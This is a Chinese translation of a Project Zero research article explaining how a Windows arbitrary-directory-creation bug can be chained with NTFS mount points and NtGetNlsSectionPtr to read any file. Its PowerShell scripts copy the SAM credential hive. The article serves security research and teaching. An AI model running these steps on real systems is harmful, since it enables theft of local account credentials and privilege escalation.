> 原文链接: https://www.anquanke.com//post/id/86605 


# 【技术分享】Windows漏洞利用技巧：从任意目录创建到任意文件读取


                                阅读量   
                                **134552**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：googleprojectzero.blogspot.sg
                                <br>原文地址：[https://googleprojectzero.blogspot.sg/2017/08/windows-exploitation-tricks-arbitrary.html](https://googleprojectzero.blogspot.sg/2017/08/windows-exploitation-tricks-arbitrary.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p1.ssl.qhimg.com/t015471fe5283fcffd3.jpg)](https://p1.ssl.qhimg.com/t015471fe5283fcffd3.jpg)**<br>**



译者：[興趣使然的小胃](http://bobao.360.cn/member/contribute?uid=2819002922)

预估稿费：200RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿



**一、前言**



在过去的几个月里，我在几次会议上介绍了我的“Windows逻辑权限提升指南”心得。会议时长只有2个小时，本来我想介绍的许多有趣的技术及技巧不得已都被删掉了。随着时间的推移，想在培训课程中完整讲述相关知识已经越来越难，因此我决定发表一系列文章，详细介绍Windows漏洞利用中一些小型的、自洽的技巧，这样当我们遇到Windows中类似的安全漏洞时，我们就能直接利用这些技巧开展工作。

在这篇文章中，我会向大家介绍从任意目录创建漏洞到任意文件读取漏洞的漏洞利用技巧。我们可以在很多地方看到任意目录创建漏洞的存在，比如，Linux子系统中就存在这样一个[漏洞](https://bugs.chromium.org/p/project-zero/issues/detail?id=891)。然而，与任意文件创建漏洞相比（任意文件创建漏洞只涉及到将某个DLL文件释放到某个目录中），这类漏洞的利用途径却不是那么明显。你可以滥用[DLL重定向](https://msdn.microsoft.com/en-us/library/windows/desktop/ms682600(v=vs.85).aspx)支持这个功能，创建一个名为**program.exe.local**的目录来实现DLL植入，然而这种方法并不是特别可靠，因为你只能重定向不在同一目录中的那些DLL（如System32目录），并且只能通过并行（Side-by-Side）模式实现DLL加载。

在本文中，为了演示方便，我会使用[代码仓库](https://github.com/tyranid/windows-logical-eop-workshop)中的一个示例驱动，该驱动已经包含一个目录创建漏洞，我们会使用[NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/1.0.7)模块，编写Powershell脚本来利用这个漏洞。这里我介绍的技术并不属于漏洞范畴，但如果你发现了一个单独的目录创建漏洞，你可以尝试着使用这种技巧。



**二、快速回顾**

当使用Win32 API来处理文件时，我们经常会使用两个函数：[CreateFile](https://msdn.microsoft.com/en-us/library/windows/desktop/aa363858(v=vs.85).aspx)以及[CreateDirectory](https://msdn.microsoft.com/en-us/library/windows/desktop/aa363855(v=vs.85).aspx)。这两个函数在功能上有所不同，因此分成两个函数也能理解。然而，在原生API（Native API）层面，所涉及的函数只有[ZwCreateFile](https://msdn.microsoft.com/en-us/library/windows/hardware/ff566424(v=vs.85).aspx)，内核在调用ZwCreateFile时，会将FILEDIRECTORYFILE或者FILE_NONDIRECTORYFILE传递给CreateOptions参数，借此区分文件以及目录。虽然这个系统调用是用来创建文件的，但所使用的标志的命名方式让人觉得目录才是主要的文件类型，这一点令我难以理解。

以内核驱动中一个非常简单的漏洞为例，如下所示：



```
NTSTATUS KernelCreateDirectory(PHANDLE Handle, PUNICODESTRING Path) `{` 
IOSTATUSBLOCK iostatus = `{` 0 `}`; 
OBJECTATTRIBUTES objattr = `{` 0 `}`;
InitializeObjectAttributes(&amp;objattr, Path, OBJCASE_INSENSITIVE | OBJKERNELHANDLE);
return ZwCreateFile(Handle, MAXIMUMALLOWED, &amp;objattr, &amp;iostatus, NULL, FILEATTRIBUTENORMAL, FILESHAREREAD | FILESHARE_DELETE, FILEOPENIF, FILEDIRECTORYFILE, NULL, 0); `}`
```

这段代码中有三个关键点需要注意，这三个关键点决定了这段代码是否存在目录创建漏洞。

**第一点，代码将FILEDIRECTORYFILE传递给CreateOptions参数，这意味着代码准备创建一个目录。**

**第二点，代码将FILEOPENIF传递给Disposition参数，这意味着如果目录不存在，代码会创建该目录，如果目录已存在，代码会打开这个目录。**

**第三点，可能也是最重要的一点，驱动调用了Zw函数，这意味着用来创建目录的调用会直接以内核权限运行，因此就会导致所有的访问检查过程失效**。在这种情况下，防御目录创建漏洞的方法是将OBJFORCEACCESSCHECK属性标志传递给OBJECTATTRIBUTES，但我们从传给InitializeObjectAttributes的标志中，可以看到程序没有设置正确的标志。

单从这段代码中，我们无法判断目的路径的来源，目的路径可能来自用户输入，也可能是个固定路径。只要这段代码是在当前进程的上下文中运行（或者在用户账户上下文中），那么这个不确定因素就不会造成任何影响。为什么代码运行在当前用户的上下文环境中是非常重要的一个因素？因为这样就能确保当目录被创建时，资源的所有者是当前用户，这意味着你可以修改安全描述符（Security Descriptor），以拥有目录的完全访问权限。但在许多情况下，这并不是一个非常必需的条件，因为许多系统目录拥有CREATOR OWNER访问控制权限，以确保目录所有者能够立刻获取全部访问权限。



**三、创建任意目录**

****

如果你想追随本文的脚步，你需要创建一个Windows 10虚拟机（32位或者64位都可以），然后根据zip文件中的setup.txt的详细说明进行操作，这个文件同时也包含了我的示例驱动。接下来你需要安装NtObjectManager Powershell模块。你可以在Powershell Gallery中找到这个模块，Powershell Gallery是一个在线的模块仓库，因此你可以访问此链接以了解更多安装细节。

一切准备就绪后，我们可以开始工作了。首先我们来看看如何调用驱动中存在漏洞的代码。驱动程序向用户提供了一个Device Object（设备对象）接口，名为DeviceWorkshopDriver（我们可以在源代码中找到这个信息)。我们可以向设备对象发送设备IO控制（Device IO Control）请求来执行漏洞代码。负责IO控制处理的代码位于device_control.c中，我们非常感兴趣的是其中的调度（dispatch）部分。我们所寻找的正是ControlCreateDir，它接受用户的输入数据，没有检查输入数据就将其当成UNICODE_STRING传递程序代码，以创建目录。如果我们搜索创建IOCTL编号的代码，我们会发现ControlCreateDir为2，因此我们可以使用如下PS代码来创建任意目录。



```
Get an IOCTL for the workshop driver.
function Get-DriverIoCtl `{` Param([int]$ControlCode) [NtApiDotNet.NtIoControlCode]::new("Unknown",` 0x800 -bor $ControlCode, "Buffered", "Any") `}`
function New-Directory `{` Param([string]$Filename) # Open the device driver. Use-NtObject($file = Get-NtFile DeviceWorkshopDriver) `{` # Get IOCTL for ControlCreateDir (2) $ioctl = Get-DriverIoCtl -ControlCode 2 # Convert DOS filename to NT $ntfilename = [NtApiDotNet.NtFileUtils]::DosFileNameToNt($Filename) $bytes = [Text.Encoding]::Unicode.GetBytes($ntfilename) $file.DeviceIoControl($ioctl, $bytes, 0) | Out-Null `}` `}`
```

New-Directory函数首先会打开设备对象，将路径转化为原生的NT格式（字节数组），然后在设备上调用DeviceIoControl函数。对于控制代码，我们可以只传递一个整数值，但我编写的NT API库拥有一个NtIoControlCode类型，可以替你封装所需的整数值。我们可以试一下，看看能否创建一个“c:windowsabc”目录。

[![](https://p5.ssl.qhimg.com/t01881780c4e625e933.png)](https://p5.ssl.qhimg.com/t01881780c4e625e933.png)

代码能够正常工作，我们成功创建了一个任意目录。我们可以使用Get-Acl来获取目录的安全描述符，根据输出信息，我们可以看到目录的所有者为“user”账户，这意味着我们可以获取该目录的完全访问权限。

现在的问题是我们如何利用这个能力。毫无疑问的是，某些系统服务可能会搜索一系列目录，来运行可执行文件或者解析配置文件。但我们最好不要过于依赖这种情况。正如本文标题所述，我们会将这种能力转换为任意文件读取能力，那么我们需要怎么做才能实现这一目标呢？



**四、滥用挂载点（Mount Point）**

****

如果你看过我关于“滥用Windows符号链接”的演讲视频，你就会了解NTFS挂载点（mount points，有时候也称为Junctions）的工作原理。$REPARSE_POINT这个NTFS属性会与目录一起存储，当打开某个目录时，NTFS驱动就会读取这个属性。该属性包含一个原生NT对象管理器（object manager），指向符号链接的目的地，该路径会回传给IO管理器以便后续处理。这种机制可以允许挂载点适用于不同的卷（volume），同时也导致了一个非常有趣的特性。具体说来，就是目的路径不一定要指向另一个目录，如果我们将其指向一个文件会发生什么情况呢？

如果你使用的是Win32 API，那么我们的尝试会以失败告终，如果使用的是NT API，你会得到一个奇怪的悖论。如果你尝试以文件形式打开挂载点，会出现错误提示其是一个目录，如果你尝试以目录形式打开挂载点，错误就会提示这是一个文件。经过验证，我们发现如果不指定FILEDIRECTORYFILE或者FILE_NONDIRECTORYFILE，那么NTFS驱动就会绕过检查过程，挂载点就可以真正重定向到某个文件。

[![](https://p4.ssl.qhimg.com/t0147f0be1b6d62fd1a.png)](https://p4.ssl.qhimg.com/t0147f0be1b6d62fd1a.png)

也许我们能找到某些系统服务，依托这些服务，在不使用这些标志的前提下打开我们的文件（如果你将**FILEFLAGBACKUP_SEMANTICS**传给CreateFile，这种方式同样也可以移除所有的标志），理想情况下，能否让这些服务读取并返回文件的数据？



**五、区域语言支持**

Windows支持许多不同的语言，为了支持非unicode编码，Windows同样也支持代码页（Code Pages）。Windows通过区域语言支持（National Language Support，NLS）库提供了各种接口，你可能会认为这些库全部运行在用户模式下，但如果你查看内核后，你会发现其中存在某些系统调用来支持NLS。本文最为感兴趣的是NtGetNlsSectionPtr这个系统调用。该系统调用会将代码页从System32目录映射到某个进程的内存中，这样NLS库就能访问代码页数据。我们不是完全清楚为什么该调用需要处于内核模式下，这样处理可能只是想让同一台主机上的所有进程都能共享数据。让我们来研究一下简化版的代码，代码篇幅并不大：



```
NTSTATUS NtGetNlsSectionPtr(DWORD NlsType, DWORD CodePage, PVOID *SectionPointer, PULONG SectionSize) `{` 
UNICODESTRING sectionname; OBJECTATTRIBUTES sectionobjattr; 
HANDLE sectionhandle; 
RtlpInitNlsSectionName(NlsType, CodePage, &amp;sectionname); 
InitializeObjectAttributes(&amp;sectionobjattr, &amp;sectionname, OBJKERNELHANDLE | OBJOPENIF | OBJCASEINSENSITIVE | OBJPERMANENT);

// Open section under NLS directory. 
if (!NTSUCCESS(ZwOpenSection(&amp;sectionhandle, SECTIONMAPREAD, &amp;sectionobjattr))) `{` // If no section then open the corresponding file and create section. UNICODESTRING filename; OBJECT_ATTRIBUTES objattr; HANDLE filehandle;
RtlpInitNlsFileName(NlsType, CodePage,  &amp;file_name);
InitializeObjectAttributes(&amp;obj_attr, &amp;file_name, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE);
ZwOpenFile(&amp;file_handle, SYNCHRONIZE, &amp;obj_attr, FILE_SHARE_READ, 0);
ZwCreateSection(&amp;section_handle, FILE_MAP_READ,  &amp;section_obj_attr, NULL, PROTECT_READ_ONLY, MEM_COMMIT, file_handle);
ZwClose(file_handle);
`}`
// Map section into memory and return pointer. 
NTSTATUS status = MmMapViewOfSection( sectionhandle, SectionPointer, SectionSize); 
ZwClose(sectionhandle); 
return status; 
`}`
```

首先需要注意的是，代码会尝试使用CodePage参数生成的名称，在 **NLS** 目录下打开一个命名内存区对象（named section object）。为了弄清具体的名字，我们需要列出这个目录信息：

[![](https://p1.ssl.qhimg.com/t019c37851121315a7d.png)](https://p1.ssl.qhimg.com/t019c37851121315a7d.png)

命名内存区的格式为NlsSectionCP,其中NUM是需要映射的代码页的编号。你还可以注意到这里存在一个内存区用于规范化数据集（normalization data set）。哪个文件会被映射取决于第一个NlsType参数，此时此刻我们还不用去考虑规范化数据集。如果代码找不到内存区对象，那么就会创建指向代码页文件的一个文件路径，使用ZwOpenFile打开该路径，然后调用ZwCreateSection来创建一个只读的命名内存区对象。最后，内存区会被映射到内存中，返回给调用者。

这里我们需要注意两件非常重要的事情。首先，对于open调用来说，OBJFORCEACCESSCHECK标志并没有被设置。这意味着即使调用者无法访问某个文件，也可以通过该调用打开该文件。最重要的是，ZwOpenFile的最后一个参数是0，这意味着FILEDIRECTORYFILE或者FILENONDIRECTORYFILE标志都没有被设置。这些标志没有被设置就能够满足我们前面提到的条件，open调用会遵循挂载点的重定向方式，以某个文件为目标，而不会产生任何错误。那么具体的文件路径被设置成什么了呢？我们可以通过反汇编RtlpInitNlsFileName来找到问题的答案。

```
void RtlpInitNlsFileName(DWORD NlsType, DWORD CodePage, PUNICODE_STRING String) `{` 
if (NlsType == NLS_CODEPAGE) `{` RtlStringCchPrintfW(String, L"\SystemRoot\System32\c_%.3d.nls", CodePage);
 `}` else `{` 
 // Get normalization path from registry. 
 // NOTE about how this is arbitrary registry write to file. 
 `}` 
 `}`
```

该文件名称的格式为“c_.nls”，位于System32目录中。需要注意的是，它使用了一种特殊的符号链接“SystemRoot”，通过设备路径格式指向Windows目录。这样就能防止通过重定向驱动器号来滥用这段代码，但同时也使其满足我们的利用场景。我们还需要注意的是，如果我们请求规范化路径，那么程序就会从主机注册表项中读取相关信息，因此，如果我们掌握注册表任意写入漏洞，我们有可能能利用这个系统调用获得另一个任意读取漏洞，但这个任务就留给有兴趣的读者去做了。

现在我们要做的事情就非常清楚了，那就是在System32中创建一个目录，目录名为c_.nls，设置其重解析数据，将其指向一个任意文件，然后使用NLS系统调用来打开以及映射这个文件。选择合适的代码页编号不是件难事，直接指定一个没用过的编号即可，比如1337。但是我们应该读取哪个文件呢？通常情况下，我们可以选择读取SAM注册表hive文件，该文件包含本地用户的登录信息。然而，访问SAM文件通常会被系统阻拦，因为该文件不可共享，即使以管理员权限以读取方式打开该文件也会遇到共享冲突错误。我们可以使用多种方法来绕过这个限制，我们可以使用注册表备份功能（这需要管理员权限），或者我们可以通过卷影复制（Volume Shadow Copy）功能获取SAM的一个备份（Windows 10中默认不启用该功能）。因此，我们还是放弃这个任务吧。稍等一下！看起来我们的运气不错，事情有所转机。

Windows文件能否共享取决于我们正在发起的访问请求。比如，如果调用者请求读取权限，但文件没有以读取权限进行共享，那么请求就会失败。然而，我们有可能可以通过特定的无内容权限（non-content rights）打开这类文件，比如读取安全描述符或者同步文件对象，系统在检查已有的文件共享设置时并不会检查这些权限。如果我们回过头来看NtGetNlsSectionPtr的代码，你会发现代码只向文件发起了SYNCHRONIZE访问权限的请求，因此，即使文件没有共享访问权限，代码依然可以打开目标文件。

但这种方式为什么能够成功？难道ZwCreateSection不需要一个可读的文件句柄来执行只读文件的映射操作吗？答案是肯定的，同时也是否定的。Windows文件对象实际上并不会去在意某个文件是否是可读的或者可写的。当文件被打开时，所创建的句柄就与相应的访问权限相关联。当我们在用户模式下调用ZwCreateSection时，该调用最终会尝试将句柄转化为指向文件对象的一个指针。为了做到这一点，调用者必须指定该句柄需要关联什么访问权限，对于只读映射而言，内核所请求的句柄具备读取数据（Read Data）访问权限。然而，与对文件的访问权限检查类似，如果内核调用了ZwCreateSection，那么访问权限检查就会被禁用，当将文件句柄转化为文件对象指针时，访问权限检查同样处于禁用状态。这样一来，当文件句柄只具备SYNCHRONIZE访问权限时，ZwCreateSection依然能够执行成功。这意味着我们可以打开系统中的任意文件，无需在意文件的共享模式，SAM文件也不例外。

因此，让我们来完成这一任务吧。我们创建了一个“SystemRootSystem32c_1337.nls”目录，将其转化为一个挂载点，挂载点重定向至“SystemRootSystem32configSAM”。然后我们调用NtGetNlsSectionPtr，请求代码页1337，这样代码就能创建内存区，并将指向内存区的指针返回给我们。最后，我们只需要将已映射的文件内存拷贝到一个新的文件中，就能完成任务。



```
$dir = "SystemRootsystem32c_1337.nls" 
New-Directory $dir
$targetpath = "SystemRootsystem32configSAM" 
Use-NtObject($file = Get-NtFile $dir ` -Options OpenReparsePoint,DirectoryFile) `{` $file.SetMountPoint($targetpath, $target_path) `}`
Use-NtObject($map = [NtApiDotNet.NtLocale]::GetNlsSectionPtr("CodePage", 1337)) `{` 
Use-NtObject($output = [IO.File]::OpenWrite("sam.bin")) `{` $map.GetStream().CopyTo($output) Write-Host "Copied file" `}` 
`}`
```

在16进制编辑器中加载我们创建的文件，根据文件内容，我们的确窃取到了SAM文件。

[![](https://p0.ssl.qhimg.com/t01d2346611bef058a7.png)](https://p0.ssl.qhimg.com/t01d2346611bef058a7.png)

为了使攻击过程更加完整，我们需要清理整个战场。我们可以使用“Delete On Close”标志打开这个目录文件，然后关闭文件，这样就能删掉这个目录（请确保以文件重解析点（reparse points）的方式打开它，否则我们需要再次打开SAM文件）。对于内存区而言，由于对象是在我们的安全上下文中创建的（与目录类似），这里没有明确可用的安全描述符，因此我们可以使用DELETE访问权限打开它，然后调用ZwMakeTemporaryObject来删除永久性的引用计数，该计数由原始的创建者使用OBJ_PERMANENT标志进行设置。

```
powershell Use-NtObject($sect = Get-NtSection nlsNlsSectionCP1337 ` -Access Delete) `{` # Delete permanent object. $sect.MakeTemporary() `}`
```



**六、总结**

****

我在这篇文章中介绍技术的并不属于一种漏洞，虽然这种技巧的应用并不是系统所希望看到的。所涉及的系统调用从Windows 7以来就已经存在，也没有发生变化，因此，如果我们发现了一个任意目录创建漏洞，我们就可以使用这种技巧来读取系统上的任意文件，无论这些文件处于被打开或者被共享的状态都可以。我将最终的脚本放在了Github上，你可以阅读相关代码了解更多细节。

当我们在逆向分析某个产品时，我们可以记录下任何存在异常的行为，这种异常点有可能会变成一个可以利用的点，正如我们在这篇文章中看到的那样。在许多情况下，我发现代码本身并没有存在漏洞，但代码拥有一些非常有用的属性，我们可以利用这些属性来构建漏洞利用链。
